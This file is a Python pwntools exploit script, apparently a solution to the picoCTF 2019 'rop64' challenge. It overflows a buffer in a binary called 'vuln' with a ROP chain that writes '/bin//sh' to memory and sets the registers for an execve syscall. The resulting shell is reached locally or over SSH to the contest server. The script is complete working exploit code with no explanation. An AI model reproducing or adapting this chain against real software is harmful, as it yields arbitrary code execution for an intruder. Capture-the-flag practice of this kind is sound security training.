from pwn import *
from struct import pack

elf = context.binary = ELF('vuln')

if args['REMOTE']:
    s = ssh(host='2019shell1.picoctf.com', user='jib1337', password='notmyrealpasswordlol')

payload = 'A'*24
payload += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e0) # @ .data
payload += pack('<Q', 0x00000000004156f4) # pop rax ; ret
payload += '/bin//sh'
payload += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000400686) # pop rdi ; ret
payload += pack('<Q', 0x00000000006b90e0) # @ .data
payload += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000040123c) # syscall

if args['REMOTE']:
    p = s.process('vuln', cwd='/problems/rop64_4_a266556e68202c0c42d6c14f6c7102b3')
else:
    p = process(elf.path)

p.sendlineafter('?\n', payload)
p.interactive()
